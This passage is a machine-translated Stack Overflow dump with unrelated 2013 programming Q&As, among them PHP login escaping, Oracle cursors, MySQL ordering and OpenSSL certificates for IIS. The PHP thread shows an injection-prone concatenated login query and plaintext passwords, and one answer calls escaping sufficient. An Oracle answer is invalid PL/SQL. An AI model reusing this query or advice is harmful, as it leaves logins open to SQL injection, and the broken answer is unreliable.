// Binding a param called :password
$stmt->bindValue(':password', $password);
// Execute the PDOStatement
$stmt->execute();
// Then fetch result
$result = $stmt->fetchAll(PDO::FETCH_ASSOC);
// ALSO, you can fetch only one row using
$firstRow = $stmt->fetch(PDO::FETCH_ASSOC); 
```

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-03-20T19:56:55.537

一方面，您要转义 $loginemail，然后在查询中使用未转义的版本。

如果可能的话，您可能要考虑的一件事是使用 PDO 和准备好的语句来简化转义和参数替换。

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2013-03-20T19:57:01.470

您使用 mysql_real_escape_string on`$loginemail`到达`$loginemail_sql`，但随后您停止在查询中使用它：

```
$q = 'SELECT uid, full_name, score, status FROM users WHERE email="'.$loginemail.'" AND password="'.$password_sql.'" LIMIT 1'; 
```

* * *

## 回答 #6

> 赞同：1
> 
> 时间：2013-03-20T19:57:13.953

我不是 sql 注入方面的专家，但转义字符串是一个很好的第一步，这应该足够了，尽管可能还有更多工作可以做。

我对您的代码的最大问题是您似乎将密码存储在数据库中的计划文本中。您应该使用盐渍哈希来存储它们。查看此内容以获取更多信息： [PHP 密码的安全哈希和盐](https://stackoverflow.com/questions/401656/secure-hash-and-salt-for-php-passwords)

你在这段代码中也犯了一个错误：

```
$q = 'SELECT uid, full_name, score, status FROM users WHERE email="'.$loginemail.'" AND password="'.$password_sql.'" LIMIT 1'; 
```

应该：

```
$q = 'SELECT uid, full_name, score, status FROM users WHERE email="'.$loginemail_sql.'" AND password="'.$password_sql.'" LIMIT 1'; 
```

# oracle - 如何摆脱游标循环以提高性能？

> ID：15533399
> 
> 赞同：0
> 
> 时间：2013-03-20T19:54:51.257
> 
> 标签：oracle, plsql, oracle10g, oracle11g

我有一个如下所示的函数，由于光标循环，它的性能非常差。我需要有人帮我摆脱光标并改用一个语句。任何人都可以提供帮助将不胜感激！

```
function get_pat_liv_donor_trans_date(p_patr_id IN NUMBER) return date is
  v_transplant_date date;
  v_rst             date;
  v_patr_id         number;

  --get patient all the patr_id(s) which has been transplanted (kidney) with living donor
  cursor c_cur1 is
    select distinct patr.patr_id
      from pat,
           pat_register         patr,
           pat_register_org_det prod,
           transplant_org_det   tod,
           transplant           trans,
           don,
           don_org_con          doc,
           allo,
           all_pat_list         apl,
           ORG_SPEC             OS,
           DON_ORG_OFF_RES      DOOR
     where pat.pat_id = patr.pat_id
       and patr.patr_id = prod.patr_id
       and prod.prod_id = tod.prod_id --patient has been transplanted (kidney)
       and tod.orgsp_id in (5, 6, 7, 8, 9) --5:Kidney-Unknown, 6:Kidney-Right, 7:Kidney-Left, 8:Kidney-Both, 9:Kidney-Single
       and trans.patr_id = patr.patr_id
       and don.don_id = doc.don_id
       and doc.doc_id = allo.doc_id
       and allo.all_id = apl.all_id
       and apl.prod_id = prod.prod_id
       and don.cadaveric_flg = 'N' --living donor
       and OS.ORGSP_ID = DOOR.ORGSP_ID
       AND DOOR.ACCEPT_IND = 'Y'
       AND DOOR.ACCEPT_CANCEL_DATE IS NULL
       AND APL.APL_ID = DOOR.APL_ID
       and pat.pat_id in (select pat.pat_id
                            from pat, pat_register patr
                           where patr.patr_id = p_patr_id)
       and patr.patr_id not in -- Not suspend registration
           (select patr_id from pat_register_suspend where end_date is null)
          --Not canceled registration
       and patr.exp_date is null;

  --get patient transplant_date which has been transplanted (kidney) with living
  cursor c_cur2 is
    select min(distinct trans.transplant_date)
      from pat,
           pat_register         patr,
           pat_register_org_det prod,
           transplant_org_det   tod,
           transplant           trans,
           don,
           don_org_con          doc,
           allo,
           all_pat_list         apl,
           ORG_SPEC             OS,
           DON_ORG_OFF_RES      DOOR
     where pat.pat_id = patr.pat_id
       and patr.patr_id = prod.patr_id
       and prod.prod_id = tod.prod_id --patient has been transplanted (kidney)
       and tod.orgsp_id in (5, 6, 7, 8, 9) --5:Kidney-Unknown, 6:Kidney-Right, 7:Kidney-Left, 8:Kidney-Both, 9:Kidney-Single
       and trans.patr_id = patr.patr_id
       and don.don_id = doc.don_id
       and doc.doc_id = allo.doc_id
       and allo.all_id = apl.all_id
       and apl.prod_id = prod.prod_id
       and patr.patr_id = v_patr_id
       and don.cadaveric_flg = 'N' --living donor
       and OS.ORGSP_ID = DOOR.ORGSP_ID
       AND DOOR.ACCEPT_IND = 'Y'
       AND DOOR.ACCEPT_CANCEL_DATE IS NULL
       AND APL.APL_ID = DOOR.APL_ID;

begin
  --if patient current is Not waiting for pancreas
  if (tttt_kp_allocation.is_pat_waiting_for_pancreas(p_patr_id) != 'Y') then
    return v_rst;
  end if;

  open c_cur1;
  loop
    fetch c_cur1
      into v_patr_id;
    exit when c_cur1%notfound;

    open c_cur2;
    fetch c_cur2
      into v_transplant_date;

    if (v_rst is null) and (v_transplant_date is not null) then
      v_rst := v_transplant_date;
    end if;

    --get earlier of Date of Living Donor transplant for PAK
    if (v_rst is not null) and (v_transplant_date is not null) then
      if (v_rst - v_transplant_date > 0) then
        v_rst := v_transplant_date;
      end if;
    end if;

    close c_cur2;

  end loop;
  close c_cur1;

  return v_rst;
end; 
```

* * *

c_cur1 将返回如下：

```
patr_id
1001
1002
1003
1004 
```

c_cur2 将返回一个日期，如：

```
2001-jan-01   ( patr_id : 1001)
2002-jan-01   ( patr_id : 1002)
2003-jan-01   ( patr_id : 1003)
2004-jan-01   ( patr_id : 1004) 
```

最终结果`v_rst`将获得从 (2001-jan-01, 2002-jan-01, 2003-jan-01, 2004-jan-01) 开始的最短日期

所以，我需要一种方法来摆脱游标循环（性能太差）并使用一条语句获得最终结果。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T20:45:03.347

您的查询`c_cur1`似乎不正确。它的结果不依赖于`p_patr_id`参数。
唯一提到的地方`p_patr_id`是以下子查询：

```
(select pat.pat_id
 from pat, pat_register patr
 where patr.patr_id = p_patr_id) 
```

这个子查询的结果显然不依赖于`p_patr_id`. :-)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T20:27:21.540

以下内容可能会对您有所帮助。

```
 function get_pat_liv_donor_trans_date(p_patr_id IN NUMBER) return date is
  v_transplant_date date;
  v_rst             date;
  v_patr_id         number;
--get patient all the patr_id(s) which has been transplanted (kidney) with living donor
select case when v_rst is null and B.transplant_date is not null then v_rst := v_transplant_date
            when v_rst IS NOT NULL AND B.transplant_date is not null AND v_rst - v_transplant_date > 0 THEN v_rst := v_transplant_date
       END
from (
    select distinct patr.patr_id
      from pat,
           pat_register         patr,
           pat_register_org_det prod,
           transplant_org_det   tod,
           transplant           trans,
           don,
           don_org_con          doc,
           allo,
           all_pat_list         apl,
           ORG_SPEC             OS,
           DON_ORG_OFF_RES      DOOR
     where pat.pat_id = patr.pat_id
       and patr.patr_id = prod.patr_id
       and prod.prod_id = tod.prod_id --patient has been transplanted (kidney)
       and tod.orgsp_id in (5, 6, 7, 8, 9) --5:Kidney-Unknown, 6:Kidney-Right, 7:Kidney-Left, 8:Kidney-Both, 9:Kidney-Single
       and trans.patr_id = patr.patr_id
       and don.don_id = doc.don_id
       and doc.doc_id = allo.doc_id
       and allo.all_id = apl.all_id
       and apl.prod_id = prod.prod_id
       and don.cadaveric_flg = 'N' --living donor
       and OS.ORGSP_ID = DOOR.ORGSP_ID
       AND DOOR.ACCEPT_IND = 'Y'
       AND DOOR.ACCEPT_CANCEL_DATE IS NULL
       AND APL.APL_ID = DOOR.APL_ID
       and pat.pat_id in (select pat.pat_id
                            from pat, pat_register patr
                           where patr.patr_id = p_patr_id)
       and patr.patr_id not in -- Not suspend registration
           (select patr_id from pat_register_suspend where end_date is null)
          --Not canceled registration
       and patr.exp_date is null
    ) A 
    inner join ( 
    select patr.patr_id, min(trans.transplant_date)
      from pat,
           pat_register         patr,
           pat_register_org_det prod,
           transplant_org_det   tod,
           transplant           trans,
           don,
           don_org_con          doc,
           allo,
           all_pat_list         apl,
           ORG_SPEC             OS,
           DON_ORG_OFF_RES      DOOR
     where pat.pat_id = patr.pat_id
       and patr.patr_id = prod.patr_id
       and prod.prod_id = tod.prod_id --patient has been transplanted (kidney)
       and tod.orgsp_id in (5, 6, 7, 8, 9) --5:Kidney-Unknown, 6:Kidney-Right, 7:Kidney-Left, 8:Kidney-Both, 9:Kidney-Single
       and trans.patr_id = patr.patr_id
       and don.don_id = doc.don_id
       and doc.doc_id = allo.doc_id
       and allo.all_id = apl.all_id
       and apl.prod_id = prod.prod_id
       and patr.patr_id = v_patr_id
       and don.cadaveric_flg = 'N' --living donor
       and OS.ORGSP_ID = DOOR.ORGSP_ID
       AND DOOR.ACCEPT_IND = 'Y'
       AND DOOR.ACCEPT_CANCEL_DATE IS NULL
       AND APL.APL_ID = DOOR.APL_ID
     group by patr.patr_id
     ) B
     on A.patr_id = B.patr_id
  return v_rst; 
```

# mysql - 更改订单输出，使用 if 或其他东西

> ID：15533401
> 
> 赞同：1
> 
> 时间：2013-03-20T19:54:54.523
> 
> 标签：mysql

```
SELECT *,`kills`-`deaths` as x FROM `users` ORDER BY `x` DESC LIMIT 0,50; 
```

桌子：

```
user|kills|deaths
a   | 10  | 9
b   | 11  | 9
c   | 0   | 0
d   | 0   | 0
e   | 0   | 0
f   | 1   | 5 
```

输出将是：

```
b | 2
a | 1
c | 0
d | 0
e | 0
f | -4 
```

我需要这样的输出：

```
b | 2
a | 1
f | -4
c | 0
d | 0
e | 0 
```

因为用户是活跃的并且他有杀戮和死亡，其他用户是不活跃的，所以他们走到了底部。

怎么做 ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-20T19:58:25.380

```
SELECT *, kills-deaths as x 
FROM users 
ORDER BY x = 0, x DESC LIMIT 0,50; 
```

[SqlFiddle](http://sqlfiddle.com/#!2/168bde/2)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-20T19:58:13.367

只需将您的活动度量添加到该`order by`子句中即可。

```
SELECT *, (kills-deaths) as x 
FROM users 
ORDER BY ((kills+deaths) <> 0), x DESC 
LIMIT 50 OFFSET 0 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-20T20:08:02.013

我通常的快速解决方案是使用 group by

```
SELECT user,`kills`-`deaths` as x 
FROM `users` 
group by user 
ORDER BY `x` DESC 
LIMIT 0,50; 
```

在这里你还可以

```
SELECT user,`kills`-`deaths` as x 
FROM `users` 
ORDER BY `kills`-`deaths` DESC 
LIMIT 0,50; 
```

我使用 group by 使任何计算只发生在一个地方并且是一致的。

# mule - mule动态设置soap操作

> ID：15533402
> 
> 赞同：1
> 
> 时间：2013-03-20T19:54:55.757
> 
> 标签：mule

在我的流程中，我有一个肥皂客户端调用服务。由于我们使用服务中的 3 种不同操作，我想动态填写 Mule soap 组件中“客户端属性”下的“操作”字段。我现在的工作方式是：

```
start flow -> message transformation -> choice flow control (based on the message type) 
choice 1\. sub flow A -> soap client with operation A 
choice 2\. sub flow B -> soap client with operation B 
choice 3\. sub flow C -> soap client with operation C 
```

我想要的是在运行时根据消息动态设置“操作”字段，而不是三个不同的子流。

```
start flow -> message transformation -> set the operation field -> soap client with the correct operation 
```

那可能吗？使用骡 CE 3.3.1。提前致谢。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-03-29T18:39:55.187

为了实现您的目标：

*   从元素中删除`operation`属性，`cxf:jaxws-client`
*   `cxf:jaxws-client`在元素之前添加将操作设置为出站消息属性：

    ```
    <set-property propertyName="operation" value="#[...]" /> 
    ```

    其中`#[...]`表示从消息中提取操作名称的 MEL 表达式。

# facebook - 调整在普通帐户上创建的 Facebook 应用程序，现在是“广告帐户”

> ID：15533408
> 
> 赞同：0
> 
> 时间：2013-03-20T19:55:30.043
> 
> 标签：facebook, ads, facebook-ads-api

当转到[http://developers.facebook.com](http://developers.facebook.com)顶部菜单中的“应用程序”链接时，它总是将我重定向到广告管理页面。我在 1 周前关闭了我的广告帐户，但这并没有帮助。我现在无法管理或添加任何应用程序真的很烦人。

我已经理解这是因为应用程序是在我的帐户仍然是“个人”帐户时创建的，并且一旦我开始在 Facebook 中使用广告，它就被切换为“广告帐户”。（另见： http: [//facebook.stackoverflow.com/questions/8507163/redirection-to-campaigns-facebook-ads-page-why](http://facebook.stackoverflow.com/questions/8507163/redirection-to-campaigns-facebook-ads-page-why)）

但是，现在我想调整我之前创建的应用程序，我该怎么做呢？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-22T19:20:02.310

使用企业帐户的[登录](https://developers.facebook.com/docs/concepts/login/)流程，与登录应用的普通用户的方式相同

以应用管理员帐户身份完成此操作后，您可以使用生成的访问令牌来访问 API 并添加其他管理员。

如果您通过 Oauth 对话框使用企业帐户授权您的应用，则可以使用管理员的访问令牌添加其他管理员。

这样做的方法在[“应用程序”文档](https://developers.facebook.com/docs/reference/api/application/)`roles`中进行了概述 - 您使用参数 app_id、用户向应用程序的连接发出 HTTP POST 请求`role` - 将“角色”设置为“管理员”以添加具有权限的管理员删除应用程序

# php - 仅处理 Codeigniter 表单中已编辑的字段

> ID：15533410
> 
> 赞同：0
> 
> 时间：2013-03-20T19:55:41.303
> 
> 标签：php, jquery, forms, codeigniter

我正在创建一个多字段搜索表单。有 9 个不同的搜索字段。但是，它们都不是强制性的。唯一的要求是您必须至少填写一个字段。

它们都在加载时显示默认值（即“状态”），而不是使用标签来指示搜索字段的用途。因此，如果您编辑一个字段但不理会其他八个字段，那么所有九个字段仍会发布一个值。

有什么好的，有效的方法来处理这个问题吗？我宁愿不必在发布之前（例如`if($(inputid).val() == 'Default Value') { ...`）或控制器（例如`if($this->input->post('name') == 'default value') { $data['name'] = ''`）之前在 jQuery 中手动执行逻辑，因为在整个站点中将进行几次此搜索的迭代，因此动态解决方案将非常有用并节省一堆时间。

谢谢！

* * *

**编辑** 这是我在下面@veddermatic 的帖子之后得到的要点：

呈现形式：

```
<form id="search-form" action="spend/search">
<input id='fname' value='First Name' data-original_value='First Name' name='fname'/>
<input id='lname' value='Last Name' data-original_value='Last Name' name='lname'/>
...
</form> 
```

鬼形态：

```
<form id="ghost-form" action="spend/search">
<!--nothing here yet-->
</form> 
```

jquery 来处理这一切：

```
$('.do-the-search').click(function(e) {
        e.preventDefault();

        $('#search-form input').each(function() {
            var $this = $(this);

            if($this.attr('data-original_value') != $this.val())
            {
                var clone = $this.clone();
                $("#ghost-form").append(clone);
            }
        });

        $("#ghost-form").submit();

    }); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:09:23.883

一种选择是拥有两种形式，一种是您当前拥有的“普通”形式，另一种是一种“幽灵”形式（它没有提交按钮或可见字段），其目标和操作与呈现给用户的形式相同。

当您为用户构建/呈现表单时，为每个输入提供一个可用于迭代它们的类，并将预填充的值放入数据属性中：

```
<input type="text" class="myFormInput" name="in1" data-original_value="blah" value="blah" />
<input type="text" class="myFormInput" name="in2" data-original_value="something" value="something" />
.... 
```

然后使用 javascript 处理面向用户的表单提交，遍历`.myFormInput`元素，如果它们的值与原始值不同，则在“ghost”表单中创建一个具有相同名称的输入元素，然后提交该表单。这只会发送更改的元素，如果由于某种原因它们关闭/禁用了 javascript，您会优雅地降级，因为您的原始表单仍将提交。

编辑：如果您确实有多个实例，您可以很容易地将它变成一个插件并在您的所有表单上使用它，所以您只需要执行以下操作：`jQuery('#userFacingForm').ghostForm();`

# apache-flex - 如何删除 Spark DataGrid 上的插入符号

> ID：15533413
> 
> 赞同：0
> 
> 时间：2013-03-20T19:55:52.037
> 
> 标签：apache-flex, flex-spark

我找不到在 Spark DataGrid 中删除或隐藏 caretIndicator 的简单方法，因此如果没有更好的方法，我将在此处发布解决方案。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T19:59:52.470

这似乎有效。要隐藏 caretIndiator，我们必须基于 spark.skins.spark.DataGridSkin 创建一个新的数据网格皮肤。然后在该皮肤中将笔画的 alpha 或矩形的 alpha 设置为 0。

*方法一：*

**MXML**：

```
<s:DataGrid skinClass="view.skins.AbstractDataGridSkin"/> 
```

**抽象数据网格皮肤**：

```
<?xml version="1.0" encoding="utf-8"?>
<spark:DataGridSkin 
    xmlns:fx="http://ns.adobe.com/mxml/2009" 
    xmlns:s="library://ns.adobe.com/flex/spark" 
    xmlns:mx="library://ns.adobe.com/flex/mx"
    xmlns:fb="http://ns.adobe.com/flashbuilder/2009"
    xmlns:spark="spark.skins.spark.*" 
    xmlns:skins="view.skins.*"
    >
    <fx:Component id="caretIndicator">
        <s:Rect implements="spark.components.gridClasses.IGridVisualElement" alpha="0">
            <fx:Script>
                <![CDATA[
                    import spark.components.DataGrid;
                    import spark.components.Grid;

                    /**
                     * @private
                     */
                    public function prepareGridVisualElement(grid:Grid, rowIndex:int, columnIndex:int):void
                    {

                        const dataGrid:DataGrid = grid.dataGrid;
                        if (!dataGrid)
                            return;

                        const color:uint = dataGrid.getStyle("caretColor");
                        caretIndicatorFill.color = color;
                    }
                ]]>
            </fx:Script>

            <s:stroke>
                <!--- @private -->
                <s:SolidColorStroke id="caretIndicatorFill" color="0x0167FF" weight="0" alpha="0"/>
            </s:stroke>
        </s:Rect>
    </fx:Component>
</spark:DataGridSkin> 
```

*方法二：*

还有[另一种方法](http://butterfliesandbugs.wordpress.com/2011/02/09/outlining-the-selected-row-in-a-spark-datagrid/)涉及复制默认数据网格皮肤并删除 caretIndicator 属性。这样可能更好：P。

*方法三：*

这也有效：

```
<spark:DataGridSkin 
    xmlns:fx="http://ns.adobe.com/mxml/2009" 
    xmlns:s="library://ns.adobe.com/flex/spark" 
    xmlns:mx="library://ns.adobe.com/flex/mx"
    xmlns:fb="http://ns.adobe.com/flashbuilder/2009"
    xmlns:spark="spark.skins.spark.*" 
    xmlns:skins="view.skins.*"
    initialize="caretIndicator = null" /> 
```

# mongodb - Mongodb $match 和 $project 聚合

> ID：15533417
> 
> 赞同：3
> 
> 时间：2013-03-20T19:56:11.997
> 
> 标签：mongodb, aggregation-framework

我有这套非常简单的文件。

```
> db.ysTest.aggregate({$project:{_id:1,unitStatus:1}});
{
"result" : [
    {
        "_id" : ObjectId("514309f3e18aa7d14100217a"),
        "unitStatus" : "es_pws"
    },
    {
        "_id" : ObjectId("514309f3e18aa7d141002816"),
        "unitStatus" : "es_run"
    },
    {
        "_id" : ObjectId("514309f0e18aa7d14100021e")
    }
],
"ok" : 1
} 
```

当使用 $match 和 $project 使用“聚合”时，我希望有 1 个文档，但我得到了所有文档。注意：我使用聚合是因为这将成为更复杂匹配的一部分，但我试图在此示例中保持简单。

```
> db.ysTest.aggregate({
... $match: {
...   unitStatus: {$exists: true, $nin: ["es_pws", "es_stl"]}
... },
... $project: {_id: 1,unitStatus:1}
... });
{
"result" : [
    {
        "_id" : ObjectId("514309f3e18aa7d14100217a"),
        "unitStatus" : "es_pws"
    },
    {
        "_id" : ObjectId("514309f3e18aa7d141002816"),
        "unitStatus" : "es_run"
    },
    {
        "_id" : ObjectId("514309f0e18aa7d14100021e")
    }
],
"ok" : 1
} 
```

我究竟做错了什么 ？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2016-05-09T13:29:09.873

通过查看您的文档、查询和评论，很明显您没有使用`$group`运算符，`$match`而只是一个 select 子句，它根据您给定的条件过滤结果。在你的情况下

```
... $match: {
...   unitStatus: {$exists: true, $nin: ["es_pws", "es_stl"]}
... } 
```

但`$match`并不`$group`保证它会返回一份文件。什么保证是您的架构，查询条件。

# c# - 本地化 MMC SnapInSettings

> ID：15533420
> 
> 赞同：0
> 
> 时间：2013-03-20T19:56:27.820
> 
> 标签：c#, mmc, mmc3

我正在尝试本地化

```
[SnapInSettings("GUID",
    DisplayName = ApplicationName, <-- this
    Description = ApplicationDescription, <-- this
    Vendor = VenderName, <-- this
    UseCustomHelp = true)] 
```

我遇到的问题是这些是在编译时设置的。因此 Resources.ApplicationName 不能使用。

我搜索了我得到的任何谷歌结果的前 10 页，发现一些对本地化和非本地化描述的引用，但从来没有样本或示例。

有没有人以前做过这个？我真正关心的是本地化描述。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-18T16:17:18.057

我最终做的是通过 WiX 安装程序安装管理单元。然后在安装程序中根据系统的语言环境写入注册表项。

这似乎可以解决问题

# math - 算术编码实现性能提升

> ID：15533423
> 
> 赞同：0
> 
> 时间：2013-03-20T19:56:32.003
> 
> 标签：math, encoding, compression

我正在优化我的算术压缩实现。我在下面包含了一个基本的算术编码算法：

```
lower bound = 0
upper bound = 1

while there are still symbols to encode
  current range = upper bound - lower bound
  upper bound = lower bound + (current range × upper bound of new symbol)
  lower bound = lower bound + (current range × lower bound of new symbol)
end while 
```

我有一个想法来四舍五入我的值，但要这样做，上限的计算不能使用下限值。我不知道该怎么做。

更多信息：我计划将下限向上舍入，缩小范围，从而保持精度，同时让我的数字的位数更少。然后以相同的方式将我的上限向下舍入。但是，如果我们增加下限的值，上界的计算会使它增加，从而使算法不正确。

我的问题是：如何在不使用下限的值的情况下计算上限？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-06-23T04:26:59.073

关于将字符串向左移动，请使用： string.substring(1)

# google-app-engine - 适用于 App Engine 数据存储和关系数据库的可移植 JDO/JPA 设计

> ID：15533425
> 
> 赞同：0
> 
> 时间：2013-03-20T19:56:40.283
> 
> 标签：google-app-engine, jpa, google-cloud-datastore, relational-database, jdo

我正在开发一个需要在 App Engine 和其他 Java 应用服务器上运行的项目。在 App Engine 中我们使用数据存储，而在其他环境中我们将使用传统的关系数据库（主要是 MySQL）。

我想知道是否有可能“拥有一个适用于两者的 JDO/JPA 模型”。

如果它是可能的。如何？具体来说，我们如何处理 Key？Datastore 要求我们使用它自己的 Key 对象或使用“Key as encoding string”，我们如何将这些键移植到关系数据库。

如果没有，最佳做法是什么？我们现在的想法是定义抽象 DAO，并有两组 DAO 实现。我相信最好的方法是将 Objectify 用于数据存储，将 JPA 用于关系数据库。但是这样我们就无法利用 GWT RequestFactory（我们正在使用的另一种技术）。或者我们可以吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-21T15:49:22.933

显然，JDO 旨在处理所有数据存储，无论是 RDBMS、ODBMS、文档、基于地图、基于 Web、基于文档、基于文件……等等。是的，这种便携性是现实的。如果您不想要可移植性，您可以使用 Objectify，但您说您想要可移植性，所以这不是一个选项（所以不知道为什么您认为它是“最佳方式”）。您可以在所有数据存储中使用字符串作为 PK。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-21T00:38:12.107

I don't know about GAE but I know JDO should be datastore independent so you can map your classes using JDO annotations and make sure while you are doing that, you aren't using any RDBMS based extensions (i.e. Datanucleus), i'm not sure if there are such extensions in the first place.

For keys, well obviously you shouldn't use GAE's but again, I'm not sure if it's a must or not.

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-03-24T13:48:50.233

我发现很难在关系数据库和分层数据库（这里的数据存储）上匹配相同的“持久性”模型，因为大多数时候它需要以不同的方式思考/构建数据。

例如，您可能需要跨多个实体复制数据，以便能够使用数据存储对其运行查询。

从您所说的关于您的项目的少数几个方面来看，如果您需要在 Google App Engine 和传统服务器（tomcat、JBOSS、WebSphere 等）中同时拥有它，我会使用 Google Cloud SQL 来保持我的数据模型相同。 .

或者，如果您在这两种情况下都需要一个分层数据库，请在您的“传统”服务器上安装一个开源数据库......

我们首先在谈论什么样的项目？:)

# spring-security - 使用 JSF 的自定义登录页面在 Spring Security 中不起作用

> ID：15533428
> 
> 赞同：0
> 
> 时间：2013-03-20T19:56:43.123
> 
> 标签：spring-security, basic-authentication

我已经从这篇[文章](http://ocpsoft.org/java/acegi-spring-security-jsf-login-page/)中得到指导，但我无法进入我的 webapp 的主页（/pages/admin/listAdmin.xhtml）。登录页面不会重定向我

PD：/pages/admin/listAdmin.xhtml 使用 PrettyFaces 映射到 /a1/

我的 XML 文件配置：

[XML 文件](http://pastebin.com/iFGvPdSU)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T23:21:48.923

我解决了我的问题。我在登录按钮中做了以下更改（我正在使用 Primefaces）

我只将参数添加`ajax="false"`到我的按钮组件

```
<p:commandButton id="loginButton" value="Ingresar" type="submit"
                        action="#{loginController.loginOn}" ajax="false"/> 
```

# jquery - jWYSIWYG 将换行符变成 在 IE9 中，但 在其他浏览器中

> ID：15533430
> 
> 赞同：1
> 
> 时间：2013-03-20T19:56:49.960
> 
> 标签：jquery, wysiwyg, jwysiwyg

我正在使用 jWYSIWYG jquery 插件将控件添加到应用程序中的文本区域。

我发现 IE 中的相同代码将换行符转换为`<P>`标签，但`<BR>`在其他浏览器中（到目前为止，Firefox、Chrome）。理想情况下，我希望它们都成为`<BR>`，或者除此之外，让它们都成为`<P>`。我至少希望它是一致的。

有解决办法吗？我看到有一个配置设置：

`brIE` 一个布尔值。如果`true`, a`<br/>`将在 IE 中插入换行符。

不幸的是，设置时它似乎没有做任何事情。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T21:37:03.447

这里问题的根源是基于浏览器的所见即所得编辑器使用浏览器进行编辑。

WYSIWYG 编辑器的基本组件只是一个设置了标志的标准元素（例如 a `<div>`） 。`contentEditable`而已。浏览器控制实际进行编辑；javascript代码无法控制这一点，浏览器可以。不同的浏览器实现它的方式也不同。

这就是为什么您从不同的浏览器获得不同结果的原因。在编辑器中，您实际上无能为力。您甚至会发现，如果您将在浏览器中创建的内容加载到不同的浏览器中，它将被重新格式化为新浏览器想要的格式，而您通常甚至不需要进行任何实际编辑。

所有基于浏览器的所见即所得编辑器都会发生这种情况。其中一些可能会尝试使浏览器差异正常化，但如您所见，成功有限。并且用户确实有一些控制权；`shift`例如，浏览器对+的反应通常`return`与仅对`return`换行符的反应不同。但这把它留给了用户，他们可能不知道这样做的必要性（毕竟，您使用所见即所得的编辑器使用户的事情变得更容易，而不是更复杂）。

因此，总的来说，您真正希望的最好结果是在服务器端代码中对其进行编辑后对其进行规范化。

# iis - IIS 上使用 OpenSSL 的不受信任的证书

> ID：15533435
> 
> 赞同：2
> 
> 时间：2013-03-20T19:57:02.653
> 
> 标签：iis, openssl, security, windows-server-2012

我使用 OpenSSL 来避免付费。在我的服务器上运行 IIS 8 和 Windows Server 2012。

我以这种方式创建了我的证书：

1.  使用 IIS 创建证书请求
2.  使用以下命令创建 RSA 私钥

    openssl genrsa -des3 -out cakey.pem 2048

3.  之后，我使用此命令生成证书

    openssl req -new -key cakey.pem -x509 -days 1825 -extensions v3_ca -out ca.crt

4.  最后我使用这个签署了证书请求：

    openssl x509 -req -days 365 -in certreq.txt -CA ca.crt -CAkey cakey.pem -CAcreateserial -out iis.cer

但是当我导航到该网站时，我收到一个“错误”，告诉我这是一个“不受信任的证书”：该网站提供的安全证书不是由受信任的证书颁发机构颁发的。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-03-22T03:10:38.983

您从 OpenSSL 工具中获得的是自签名证书。当然，任何浏览器都不信任它，谁能说你值得信任。

如果您想建立一个公共网站，请购买证书。这是您必须支付的费用，就像公共域名一样。

相反，如果您要为公司托管内部网站，则可以通过多种方式设置您自己的 CA，例如使用 Microsoft Active Directory 证书服务。

**2018 年更新：今天有更多选项可以获得免费证书，例如[Let's Encrypt](https://letsencrypt.org)。检查它们并充分利用它们。**

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-03-22T02:37:13.763

在尝试访问运行您在 CA 层次结构下生​​成的证书的 IIS 服务器之前，您是否将 CA 证书安装到浏览器中？[这是有关该步骤](http://kb.wisc.edu/page.php?id=11162)的一些信息。

# java - 类型不匹配：无法从 Object 转换为 BitVectorFlowMap

> ID：15533442
> 
> 赞同：0
> 
> 时间：2013-03-20T19:57:30.543
> 
> 标签：java, debugging

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-03-20T19:59:28.613

`super.clone()`is的返回类型`Object`，因为它是 的直接祖先`BitVectorFlowMap`，因此它不是 的有效返回值`clone()`，它必须返回某种类型的东西`BitVectorFlowMap`。您必须实际构建一个`BitVectorFlowMap`具有相同数据的新实例。

# javascript - 像在主题森林上一样获得风格切换器

> ID：15533445
> 
> 赞同：-1
> 
> 时间：2013-03-20T19:57:42.390
> 
> 标签：javascript, jquery, html, drupal-7, drupal-modules

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-03-20T20:12:24.250

这很容易自己创建，只需使用 onClick 处理程序添加类，然后使用您认为合适的类进行样式设置。他们可能没有为此使用插件，但实际上是他们使用 jQuery 库自己创建的定制功能。

例如。

```
$('.style').on('click',function(){
   $('.itemToChange').addClass('styleOne');
}); 
```

请参阅此[Fiddle](http://jsfiddle.net/c7gtV/)的基本示例。

请注意这是一个**非常**基本的版本，您展示的示例更深入

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2017-06-28T19:55:41.523

如果有人还在看这里有两个解决方案

[Blast.js](http://www.jqueryscript.net/other/Minimal-jQuery-Based-Site-Theme-Color-Scheme-Switcher-Blast-js.html)或 [JTS](http://www.jqueryscript.net/other/jQuery-Plugin-To-Create-A-Theme-Skin-Switcher.html)

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2013-03-20T20:03:00.727

您提供的示例正在使用此

[http://drupal.org/project/flexslider](http://drupal.org/project/flexslider)

编辑

对不起，我弄糊涂了。

样式切换器是由 Themeforest 背后的公司 Envato 定制的，您可以在此处找到代码

[http://centum.envato.tabvn.com/sites/all/themes/centum/js/switcher.js](http://centum.envato.tabvn.com/sites/all/themes/centum/js/switcher.js)

# node.js - Node js - 连接池的 http.request() 问题

> ID：15533448
> 
> 赞同：10
> 
> 时间：2013-03-20T19:57:44.847
> 
> 标签：node.js, request, connection-pooling

考虑以下简单的 Node.js 应用程序：

```
var http = require('http');
http.createServer(function() { }).listen(8124); // Prevent process shutting down

var requestNo = 1;
var maxRequests = 2000;

